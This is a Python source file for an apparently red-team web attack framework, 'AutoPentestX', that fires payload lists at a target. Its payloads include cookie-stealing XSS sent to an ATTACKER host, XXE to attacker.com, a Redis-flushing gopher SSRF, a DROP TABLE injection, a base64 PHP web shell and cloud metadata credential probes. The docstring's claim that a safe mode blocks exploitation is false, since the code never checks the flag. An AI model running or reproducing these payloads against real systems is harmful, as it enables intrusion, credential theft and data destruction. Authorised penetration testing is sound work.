#!/usr/bin/env python3
"""
AutoPentestX - Advanced Web Application Attack Module
Red Team: XSS, SQLi, LFI/RFI, SSRF, XXE, IDOR, CORS, JWT attacks,
directory fuzzing, API enumeration, header injection, and more.
"""

import re
import json
import socket
import urllib.request
import urllib.parse
import urllib.error
import ssl
import time
import concurrent.futures
from datetime import datetime

R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
C = '\033[96m'; M = '\033[95m'; B = '\033[1m'; X = '\033[0m'


# ─────────────────────────────────────────────────────────────────────────────
#  PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    'javascript:alert(1)',
    '"><img src=x onerror=alert(document.domain)>',
    '<details open ontoggle=alert(1)>',
    '{{7*7}}',               # Template injection probe
    '${7*7}',
    '#{7*7}',
    '<script>fetch("http://ATTACKER/?c="+document.cookie)</script>',
]

SQLI_PAYLOADS = [
    "'", '"', ';', '-- -', '/*', '*/',
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "' AND SLEEP(3)--",                 # Time-based blind
    "1; WAITFOR DELAY '0:0:3'--",       # MSSQL time-based
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "'; DROP TABLE users--",            # Classic
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
]

LFI_PAYLOADS = [
    '../etc/passwd',
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../../../etc/passwd',
    '....//....//....//etc/passwd',
    '%2e%2e%2fetc%2fpasswd',
    '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '/etc/passwd%00',
    'php://filter/convert.base64-encode/resource=/etc/passwd',
    'php://input',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
    'expect://id',
    'file:///etc/passwd',
    '/proc/self/environ',
    '/proc/self/cmdline',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    '..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
]

SSRF_PAYLOADS = [
    'http://127.0.0.1/',
    'http://localhost/',
    'http://0.0.0.0/',
    'http://[::1]/',
    'http://169.254.169.254/',                    # AWS metadata
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/',            # GCP metadata
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://100.100.100.200/latest/meta-data/',   # Alibaba metadata
    'http://192.168.0.1/',
    'http://10.0.0.1/',
    'http://172.16.0.1/',
    'dict://127.0.0.1:6379/info',                 # Redis
    'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
    'file:///etc/passwd',
    'sftp://attacker.com/x',
    'tftp://attacker.com/x',
]

XXE_PAYLOADS = [
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo/>''',
    '''<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data (#ANY)><!ENTITY xxe SYSTEM "file:///etc/shadow">]><data>&xxe;</data>''',
    '''<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>''',
]

CORS_ORIGINS = [
    'https://evil.com',
    'https://attacker.com',
    'null',
    'https://trusted.com.evil.com',
    'http://localhost',
]

DIRS_WORDLIST = [
    '.git', '.env', '.htaccess', '.htpasswd', 'robots.txt', 'sitemap.xml',
    'admin', 'administrator', 'admin.php', 'admin/', 'wp-admin/', 'manager/',
    'login', 'login.php', 'signin', 'auth', 'dashboard', 'panel', 'control',
    'api', 'api/v1', 'api/v2', 'graphql', 'swagger', 'swagger-ui.html',
    'swagger/index.html', 'openapi.json', 'openapi.yaml', 'api-docs',
    'backup', 'backup.zip', 'backup.tar.gz', 'db.sql', 'database.sql',
    'config.php', 'config.yml', 'config.json', 'configuration.php',
    'phpinfo.php', 'info.php', 'test.php', 'shell.php', 'cmd.php',
    'upload', 'uploads', 'files', 'media', 'images', 'assets', 'static',
    'server-status', 'server-info', '.DS_Store', 'web.config', 'wp-config.php',
    'app.js', 'app.py', 'main.py', 'index.php~', 'index.html~',
    'console', 'actuator', 'actuator/health', 'actuator/env', 'actuator/beans',
    'metrics', 'health', 'trace', 'env', 'dump', 'heapdump', 'threaddump',
    'v1', 'v2', 'v3', 'rest', 'rpc', 'jsonrpc', 'soap', 'wsdl', 'xmlrpc',
    'crossdomain.xml', 'clientaccesspolicy.xml', 'security.txt', '/.well-known/',
    'debug', 'testing', 'dev', 'development', 'staging', 'uat', 'qa',
    'cgi-bin/', 'cgi-bin/test.cgi', 'cgi-bin/printenv.pl',
    'old', 'bak', 'new', 'www', 'web', 'public', 'private', 'secret',
    '.svn', '.bzr', 'CVS', '.hg', 'Dockerfile', 'docker-compose.yml',
]

HTTP_HEADERS_INJECTION = [
    ('X-Forwarded-For', '127.0.0.1'),
    ('X-Real-IP', '127.0.0.1'),
    ('X-Originating-IP', '127.0.0.1'),
    ('X-Remote-IP', '127.0.0.1'),
    ('X-Client-IP', '127.0.0.1'),
    ('X-Host', 'evil.com'),
    ('X-Forwarded-Host', 'evil.com'),
    ('Host', 'evil.com'),
]


class WebAttackFramework:
    """
    Comprehensive web application attack framework for Red Team assessments.
    Covers OWASP Top 10 + advanced techniques. Runs in assessment/simulation
    mode by default — actual exploitation requires --no-safe-mode.
    """

    def __init__(self, target: str, ports: list = None, safe_mode: bool = True):
        self.target = target
        self.safe_mode = safe_mode
        self.base_urls = self._build_base_urls(ports or [])
        self.results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'xss': [],
            'sqli': [],
            'lfi': [],
            'ssrf': [],
            'xxe': [],
            'cors': [],
            'open_dirs': [],
            'header_issues': [],
            'jwt_issues': [],
            'idor_candidates': [],
            'api_endpoints': [],
            'security_headers': {},
        }
        self.session_headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }

    # ─────────────────────────────────────────────────────────
    #  HELPERS
    # ─────────────────────────────────────────────────────────
    def _build_base_urls(self, ports: list) -> list:
        urls = []
        web_ports = {p['port']: p for p in ports if p.get('port') in (80, 443, 8080, 8443, 8000, 8888, 3000, 4443)}
        if not web_ports:
            urls = [f'http://{self.target}', f'https://{self.target}']
        else:
            for port, info in web_ports.items():
                scheme = 'https' if port in (443, 8443, 4443) else 'http'
                urls.append(f'{scheme}://{self.target}:{port}')
        return urls

    def _http_get(self, url: str, headers: dict = None, timeout: int = 8) -> tuple:
        """Return (status_code, headers_dict, body_str). Returns (0,'','') on error."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            h = {**self.session_headers, **(headers or {})}
            req = urllib.request.Request(url, headers=h)
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read(16384).decode('utf-8', errors='ignore')
                return resp.status, dict(resp.headers), body
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers) if e.headers else {}, ''
        except Exception:
            return 0, {}, ''

    def _print(self, level: str, msg: str):
        icons = {'info': f'{C}[*]{X}', 'ok': f'{G}[✓]{X}',
                 'warn': f'{Y}[!]{X}', 'vuln': f'{R}[VULN]{X}',
                 'find': f'{M}[+]{X}'}
        print(f'  {icons.get(level, "[?]")} {msg}')

    # ─────────────────────────────────────────────────────────
    #  1. SECURITY HEADER AUDIT
    # ─────────────────────────────────────────────────────────
    def audit_security_headers(self) -> dict:
        self._print('info', 'Auditing HTTP security headers...')
        required_headers = {
            'strict-transport-security': 'HSTS missing — SSL stripping possible',
            'x-content-type-options':   'X-Content-Type-Options missing — MIME sniffing',
            'x-frame-options':          'X-Frame-Options missing — Clickjacking possible',
            'content-security-policy':  'CSP missing — XSS impact amplified',
            'referrer-policy':          'Referrer-Policy missing — info leakage',
            'permissions-policy':       'Permissions-Policy missing',
            'x-xss-protection':         'X-XSS-Protection missing (legacy browsers)',
            'cache-control':            'Cache-Control not set',
        }
        issues = {}
        for base_url in self.base_urls[:2]:
            status, headers, _ = self._http_get(base_url)
            if status == 0:
                continue
            headers_lower = {k.lower(): v for k, v in headers.items()}
            for hdr, desc in required_headers.items():
                if hdr not in headers_lower:
                    issues[hdr] = {'missing': True, 'description': desc}
                    self._print('vuln', f'Missing: {Y}{hdr}{X} — {desc}')
                else:
                    issues[hdr] = {'missing': False, 'value': headers_lower[hdr]}

            # Check for information-disclosing headers
            for leak_hdr in ['server', 'x-powered-by', 'x-aspnet-version', 'x-generator']:
                if leak_hdr in headers_lower:
                    self._print('find', f'Info disclosure: {R}{leak_hdr}: {headers_lower[leak_hdr]}{X}')
            break

        self.results['security_headers'] = issues
        return issues

    # ─────────────────────────────────────────────────────────
    #  2. DIRECTORY & FILE FUZZING
    # ─────────────────────────────────────────────────────────
    def fuzz_directories(self, threads: int = 30) -> list:
        self._print('info', f'Fuzzing {len(DIRS_WORDLIST)} paths across {len(self.base_urls)} base URLs...')
        found = []

        def probe(args):
            base, path = args
            url = f'{base}/{path.lstrip("/")}'
            status, headers, body = self._http_get(url, timeout=6)
            if status in (200, 301, 302, 403, 401):
                size = len(body)
                entry = {'url': url, 'status': status, 'size': size,
                         'content_type': headers.get('Content-Type', '')}
                return entry
            return None

        tasks = [(b, p) for b in self.base_urls[:2] for p in DIRS_WORDLIST]
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
            for result in pool.map(probe, tasks):
                if result:
                    found.append(result)
                    color = R if result['status'] == 200 else Y
                    self._print('find', f'{color}HTTP {result["status"]}{X} {result["url"]} ({result["size"]} bytes)')

        self.results['open_dirs'] = found
        self._print('ok', f'Directory fuzzing complete — {len(found)} paths found')
        return found

    # ─────────────────────────────────────────────────────────
    #  3. XSS DETECTION
    # ─────────────────────────────────────────────────────────
    def test_xss(self) -> list:
        self._print('info', 'Testing for Cross-Site Scripting (XSS)...')
        findings = []

        for base_url in self.base_urls[:2]:
            # Common XSS injection points
            test_params = ['q', 'search', 'id', 'name', 'input', 'query', 'term',
                           'keyword', 'text', 'msg', 'message', 'comment', 'redirect',
                           'url', 'next', 'return', 'callback', 'ref', 'path', 'file']
            for param in test_params:
                for payload in XSS_PAYLOADS[:6]:  # Use first 6 per param (speed)
                    encoded = urllib.parse.quote(payload)
                    url = f'{base_url}/?{param}={encoded}'
                    status, headers, body = self._http_get(url)
                    # Reflected XSS: payload echoed back unencoded
                    if payload in body or payload.replace('<', '&lt;') not in body and payload in body:
                        finding = {
                            'type': 'Reflected XSS',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'confidence': 'HIGH',
                            'cvss': 6.1,
                        }
                        findings.append(finding)
                        self._print('vuln', f'{R}XSS{X} param={Y}{param}{X} payload={C}{payload[:50]}{X}')
                        break  # One hit per param is enough

        self.results['xss'] = findings
        return findings

    # ─────────────────────────────────────────────────────────
    #  4. SQL INJECTION DETECTION
    # ─────────────────────────────────────────────────────────
    def test_sqli(self) -> list:
        self._print('info', 'Testing for SQL Injection...')
        findings = []

        sqli_error_patterns = [
            r"you have an error in your sql syntax",
            r"warning: mysql",
            r"unclosed quotation mark",
            r"quoted string not properly terminated",
            r"syntax error.*sql",
            r"microsoft sql native client",
            r"ole db.*sql server",
            r"ora-\d{5}",           # Oracle errors
            r"postgresql.*error",
            r"sqlite.*error",
            r"mysql_fetch",
            r"pg_query",
            r"sql command not properly ended",
        ]

        for base_url in self.base_urls[:2]:
            test_params = ['id', 'user', 'username', 'uid', 'page', 'cat', 'category',
                           'item', 'product', 'pid', 'article', 'post', 'news', 'select']
            for param in test_params:
                for payload in SQLI_PAYLOADS[:8]:
                    encoded = urllib.parse.quote(payload)
                    url = f'{base_url}/?{param}={encoded}'
                    status, headers, body = self._http_get(url)
                    body_lower = body.lower()

                    # Error-based
                    for pattern in sqli_error_patterns:
                        if re.search(pattern, body_lower):
                            finding = {
                                'type': 'Error-based SQLi',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'error_pattern': pattern,
                                'confidence': 'HIGH',
                                'cvss': 9.8,
                            }
                            findings.append(finding)
                            self._print('vuln', f'{R}SQL INJECTION{X} (error-based) param={Y}{param}{X}')
                            break

        self.results['sqli'] = findings
        return findings

    # ─────────────────────────────────────────────────────────
    #  5. LFI / PATH TRAVERSAL
    # ─────────────────────────────────────────────────────────
    def test_lfi(self) -> list:
        self._print('info', 'Testing for Local File Inclusion / Path Traversal...')
        findings = []
        lfi_params = ['file', 'page', 'include', 'path', 'template', 'view',
                      'doc', 'document', 'load', 'read', 'dir', 'lang', 'language']

        lfi_signatures = ['root:x:', 'root:!:', 'daemon:', '[fonts]',
                          'for 16-bit', 'ECHO is on']

        for base_url in self.base_urls[:2]:
            for param in lfi_params:
                for payload in LFI_PAYLOADS[:10]:
                    encoded = urllib.parse.quote(payload)
                    url = f'{base_url}/?{param}={encoded}'
                    _, _, body = self._http_get(url)
                    if any(sig in body for sig in lfi_signatures):
                        finding = {
                            'type': 'Local File Inclusion',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'confidence': 'HIGH',
                            'cvss': 7.5,
                            'evidence': body[:200],
                        }
                        findings.append(finding)
                        self._print('vuln', f'{R}LFI CONFIRMED{X} param={Y}{param}{X} payload={C}{payload}{X}')
                        break

        self.results['lfi'] = findings
        return findings

    # ─────────────────────────────────────────────────────────
    #  6. SSRF DETECTION
    # ─────────────────────────────────────────────────────────
    def test_ssrf(self) -> list:
        self._print('info', 'Testing for Server-Side Request Forgery (SSRF)...')
        findings = []
        ssrf_params = ['url', 'uri', 'link', 'src', 'source', 'dest', 'destination',
                       'redirect', 'target', 'fetch', 'load', 'proxy', 'image',
                       'img', 'callback', 'webhook', 'host', 'ip', 'addr']

        aws_meta_patterns = ['ami-id', 'instance-id', 'hostname', 'public-ipv4',
                             'security-credentials', 'iam']

        for base_url in self.base_urls[:2]:
            for param in ssrf_params:
                # Test AWS metadata endpoint
                for ssrf_payload in SSRF_PAYLOADS[:5]:
                    encoded = urllib.parse.quote(ssrf_payload)
                    url = f'{base_url}/?{param}={encoded}'
                    _, _, body = self._http_get(url, timeout=5)
                    if any(sig in body.lower() for sig in aws_meta_patterns + ['root:x:', '127.0.0.1']):
                        finding = {
                            'type': 'SSRF',
                            'url': url,
                            'parameter': param,
                            'payload': ssrf_payload,
                            'confidence': 'HIGH',
                            'cvss': 9.1,
                            'evidence': body[:300],
                        }
                        findings.append(finding)
                        self._print('vuln', f'{R}SSRF CONFIRMED{X} param={Y}{param}{X} → {C}{ssrf_payload}{X}')
                        break

        self.results['ssrf'] = findings
        return findings

    # ─────────────────────────────────────────────────────────
    #  7. CORS MISCONFIGURATION
    # ─────────────────────────────────────────────────────────
    def test_cors(self) -> list:
        self._print('info', 'Testing CORS configuration...')
        findings = []

        for base_url in self.base_urls[:2]:
            for origin in CORS_ORIGINS:
                _, headers, _ = self._http_get(base_url, headers={'Origin': origin})
                acao = headers.get('Access-Control-Allow-Origin', '')
                acac = headers.get('Access-Control-Allow-Credentials', '')

                if acao in (origin, '*') or acao == 'null':
                    creds = acac.lower() == 'true'
                    finding = {
                        'type': 'CORS Misconfiguration',
                        'url': base_url,
                        'reflected_origin': acao,
                        'credentials_allowed': creds,
                        'test_origin': origin,
                        'confidence': 'HIGH' if creds else 'MEDIUM',
                        'cvss': 8.1 if creds else 5.4,
                        'impact': 'Credential theft possible' if creds else 'Data leakage possible',
                    }
                    findings.append(finding)
                    flag = f'{R}+ credentials!{X}' if creds else ''
                    self._print('vuln', f'{R}CORS{X} reflects origin={Y}{origin}{X} {flag}')

        self.results['cors'] = findings
        return findings

    # ─────────────────────────────────────────────────────────
    #  8. JWT ATTACK SURFACE
    # ─────────────────────────────────────────────────────────
    def test_jwt_weaknesses(self) -> list:
        self._print('info', 'Probing JWT attack surface...')
        findings = []

        # None algorithm bypass token (header.payload.empty_sig)
        import base64

        def b64url(data: str) -> str:
            return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()

        none_payloads = []
        for alg in ['none', 'None', 'NONE', 'nOnE']:
            header = b64url(json.dumps({"alg": alg, "typ": "JWT"}))
            payload = b64url(json.dumps({"sub": "1", "role": "admin", "iat": 1700000000}))
            none_payloads.append(f'{header}.{payload}.')

        jwt_endpoints = ['/api/user', '/api/me', '/api/profile',
                         '/api/admin', '/dashboard', '/user/info']
        for base_url in self.base_urls[:2]:
            for ep in jwt_endpoints:
                url = base_url + ep
                # Test 'none' algorithm bypass
                for jwt_token in none_payloads[:2]:
                    status, _, body = self._http_get(url, headers={
                        'Authorization': f'Bearer {jwt_token}'
                    })
                    if status in (200, 201) and 'unauthorized' not in body.lower():
                        finding = {
                            'type': 'JWT None Algorithm Bypass',
                            'url': url,
                            'token_used': jwt_token,
                            'response_code': status,
                            'confidence': 'HIGH',
                            'cvss': 9.8,
                        }
                        findings.append(finding)
                        self._print('vuln', f'{R}JWT None-alg bypass{X} at {url}')

        self.results['jwt_issues'] = findings
        return findings

    # ─────────────────────────────────────────────────────────
    #  9. API ENDPOINT DISCOVERY
    # ─────────────────────────────────────────────────────────
    def discover_api_endpoints(self) -> list:
        self._print('info', 'Discovering API endpoints...')
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3', '/graphql', '/graphiql',
            '/playground', '/swagger', '/swagger-ui', '/swagger.json',
            '/swagger/v1/swagger.json', '/openapi.json', '/openapi.yaml',
            '/api-docs', '/api-docs.json', '/redoc', '/v1', '/v2', '/v3',
            '/rest', '/rpc', '/jsonrpc', '/soap', '/wsdl', '/?wsdl',
            '/api/swagger', '/api/swagger-ui.html', '/api/openapi.json',
            '/api/users', '/api/user', '/api/me', '/api/health', '/api/status',
            '/api/config', '/api/settings', '/api/admin', '/api/products',
        ]

        discovered = []
        for base_url in self.base_urls[:2]:
            for path in api_paths:
                url = base_url + path
                status, headers, body = self._http_get(url, timeout=5)
                if status in (200, 201, 401, 403) and len(body) > 20:
                    ct = headers.get('Content-Type', '')
                    entry = {
                        'url': url,
                        'status': status,
                        'content_type': ct,
                        'size': len(body),
                        'has_swagger': 'swagger' in body.lower() or 'openapi' in body.lower(),
                        'is_json': 'json' in ct.lower() or body.strip().startswith('{'),
                    }
                    discovered.append(entry)
                    indicator = f'{G}[SWAGGER]{X}' if entry['has_swagger'] else f'{M}[API]{X}'
                    self._print('find', f'{indicator} HTTP {status} {url}')

        self.results['api_endpoints'] = discovered
        return discovered

    # ─────────────────────────────────────────────────────────
    #  10. HTTP HEADER INJECTION TESTS
    # ─────────────────────────────────────────────────────────
    def test_header_injection(self) -> list:
        self._print('info', 'Testing HTTP header injection / IP spoofing...')
        findings = []

        for base_url in self.base_urls[:1]:
            for hdr_name, hdr_val in HTTP_HEADERS_INJECTION:
                status, _, body = self._http_get(base_url, headers={hdr_name: hdr_val})
                if status == 200 and ('127.0.0.1' in body or 'localhost' in body):
                    finding = {
                        'type': 'Header Injection / IP Spoofing',
                        'header': hdr_name,
                        'value': hdr_val,
                        'url': base_url,
                        'cvss': 5.3,
                    }
                    findings.append(finding)
                    self._print('vuln', f'{Y}Header accepted:{X} {hdr_name}: {hdr_val}')

        self.results['header_issues'] = findings
        return findings

    # ─────────────────────────────────────────────────────────
    #  ORCHESTRATION
    # ─────────────────────────────────────────────────────────
    def run_full_web_attack(self) -> dict:
        print(f'\n{C}╔══════════════════════════════════════════════════════════╗{X}')
        print(f'{C}║{X} {B}{M}[WEB ATTACK FRAMEWORK]{X} Target: {Y}{self.target}{X}')
        print(f'{C}║{X} {Y}Safe Mode: {"[✓] ON" if self.safe_mode else "[✗] OFF"}{X}')
        print(f'{C}╚══════════════════════════════════════════════════════════╝{X}\n')

        if not self.base_urls:
            self._print('warn', 'No web services detected — skipping web attack module')
            return self.results

        self.audit_security_headers()
        self.fuzz_directories()
        self.test_xss()
        self.test_sqli()
        self.test_lfi()
        self.test_ssrf()
        self.test_cors()
        self.test_jwt_weaknesses()
        self.discover_api_endpoints()
        self.test_header_injection()

        self.results['completed_at'] = datetime.now().isoformat()

        # Summary
        total_vulns = sum(len(v) for k, v in self.results.items() if isinstance(v, list))
        print(f'\n{G}[✓]{X} Web attack module complete — {R}{total_vulns}{X} findings across all tests')
        return self.results
